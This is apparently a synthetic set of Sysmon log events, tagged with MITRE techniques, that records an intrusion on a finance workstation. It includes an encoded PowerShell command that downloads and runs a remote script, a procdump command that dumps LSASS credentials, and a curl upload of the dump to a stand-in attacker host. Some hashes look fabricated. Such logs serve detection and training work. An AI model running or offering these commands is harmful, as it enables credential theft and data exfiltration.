[
  {
    "event_id": "1",
    "record_id": "104821",
    "timestamp": "2026-09-29T01:15:02.124Z",
    "computer": "FINANCE-WKS01.corp.internal",
    "provider": "Microsoft-Windows-Sysmon",
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "level": "Information",
    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADAANQAvAGkAbgBqAGUAYwB0AC4AcABzADEAJwApAA==",
    "parent_image": "C:\\Windows\\explorer.exe",
    "user": "CORP\\jdoe",
    "hashes": "SHA256=9548E3875323E7DBE9B8D0F78B451A2461D4C2B1D659E4E302941E5D57B2F642",
    "process_id": "4820",
    "thread_id": "1840",
    "system_data": {
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "Provider_Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
      "EventID": "1",
      "TimeCreated_SystemTime": "2026-09-29T01:15:02.124Z",
      "EventRecordID": "104821",
      "Execution_ProcessID": "4820",
      "Execution_ThreadID": "1840",
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "FINANCE-WKS01.corp.internal"
    },
    "event_data": {
      "RuleName": "technique_id=T1059.001,technique_name=PowerShell",
      "UtcTime": "2026-09-29 01:15:02.124",
      "ProcessGuid": "{5770385F-9102-6523-1100-000000000F00}",
      "ProcessId": "4820",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADAANQAvAGkAbgBqAGUAYwB0AC4AcABzADEAJwApAA==",
      "CurrentDirectory": "C:\\Users\\jdoe\\Downloads\\",
      "User": "CORP\\jdoe",
      "LogonId": "0x0000000001a4f821",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=9548E3875323E7DBE9B8D0F78B451A2461D4C2B1D659E4E302941E5D57B2F642",
      "ParentProcessGuid": "{5770385F-9000-6523-0100-000000000F00}",
      "ParentProcessId": "3412",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "C:\\Windows\\explorer.exe"
    }
  },
  {
    "event_id": "10",
    "record_id": "104825",
    "timestamp": "2026-09-29T01:15:18.450Z",
    "computer": "FINANCE-WKS01.corp.internal",
    "provider": "Microsoft-Windows-Sysmon",
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "level": "Warning",
    "image": "C:\\Users\\jdoe\\Downloads\\procdump64.exe",
    "command_line": "procdump64.exe -ma lsass.exe C:\\Users\\Public\\Downloads\\lsass.dmp",
    "parent_image": "C:\\Windows\\System32\\cmd.exe",
    "user": "CORP\\jdoe",
    "hashes": "SHA256=B21A0F9B4895C2E63D084616FA57C8906B42A45C33E62B1D77A01684C2114785",
    "process_id": "6104",
    "thread_id": "4120",
    "system_data": {
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "Provider_Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
      "EventID": "10",
      "TimeCreated_SystemTime": "2026-09-29T01:15:18.450Z",
      "EventRecordID": "104825",
      "Execution_ProcessID": "6104",
      "Execution_ThreadID": "4120",
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "FINANCE-WKS01.corp.internal"
    },
    "event_data": {
      "RuleName": "technique_id=T1003.001,technique_name=LSASS Memory Dump",
      "UtcTime": "2026-09-29 01:15:18.450",
      "SourceProcessId": "6104",
      "SourceImage": "C:\\Users\\jdoe\\Downloads\\procdump64.exe",
      "TargetProcessId": "672",
      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
      "GrantedAccess": "0x1FFFFF",
      "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d384|C:\\Windows\\System32\\KERNELBASE.dll+2c31e|procdump64.exe+b182",
      "SourceUser": "CORP\\jdoe",
      "TargetUser": "NT AUTHORITY\\SYSTEM"
    }
  },
  {
    "event_id": "11",
    "record_id": "104828",
    "timestamp": "2026-09-29T01:15:21.012Z",
    "computer": "FINANCE-WKS01.corp.internal",
    "provider": "Microsoft-Windows-Sysmon",
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "level": "Information",
    "image": "C:\\Users\\jdoe\\Downloads\\procdump64.exe",
    "command_line": "",
    "parent_image": "",
    "user": "CORP\\jdoe",
    "hashes": "",
    "process_id": "6104",
    "thread_id": "4120",
    "system_data": {
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "Provider_Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
      "EventID": "11",
      "TimeCreated_SystemTime": "2026-09-29T01:15:21.012Z",
      "EventRecordID": "104828",
      "Execution_ProcessID": "6104",
      "Execution_ThreadID": "4120",
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "FINANCE-WKS01.corp.internal"
    },
    "event_data": {
      "RuleName": "technique_id=T1003.001,technique_name=LSASS Dump File",
      "UtcTime": "2026-09-29 01:15:21.012",
      "ProcessId": "6104",
      "Image": "C:\\Users\\jdoe\\Downloads\\procdump64.exe",
      "TargetFilename": "C:\\Users\\Public\\Downloads\\lsass.dmp",
      "CreationUtcTime": "2026-09-29 01:15:21.012",
      "User": "CORP\\jdoe"
    }
  },
  {
    "event_id": "3",
    "record_id": "104832",
    "timestamp": "2026-09-29T01:15:35.890Z",
    "computer": "FINANCE-WKS01.corp.internal",
    "provider": "Microsoft-Windows-Sysmon",
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "level": "Information",
    "image": "C:\\Windows\\System32\\curl.exe",
    "command_line": "curl.exe -F file=@C:\\Users\\Public\\Downloads\\lsass.dmp https://attacker-c2-server.net/upload",
    "parent_image": "C:\\Windows\\System32\\cmd.exe",
    "user": "CORP\\jdoe",
    "hashes": "SHA256=128504B6D873C872A5D1904571A12894101A2461D4C2B1D659E4E302941E5D57",
    "process_id": "7820",
    "thread_id": "2104",
    "system_data": {
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "Provider_Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
      "EventID": "3",
      "TimeCreated_SystemTime": "2026-09-29T01:15:35.890Z",
      "EventRecordID": "104832",
      "Execution_ProcessID": "7820",
      "Execution_ThreadID": "2104",
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "FINANCE-WKS01.corp.internal"
    },
    "event_data": {
      "RuleName": "technique_id=T1041,technique_name=Exfiltration Over C2 Channel",
      "UtcTime": "2026-09-29 01:15:35.890",
      "ProcessId": "7820",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "User": "CORP\\jdoe",
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIsIpv6": "false",
      "SourceIp": "192.168.10.145",
      "SourceHostname": "FINANCE-WKS01.corp.internal",
      "SourcePort": "49822",
      "DestinationIsIpv6": "false",
      "DestinationIp": "198.51.100.45",
      "DestinationHostname": "attacker-c2-server.net",
      "DestinationPort": "443"
    }
  }
]
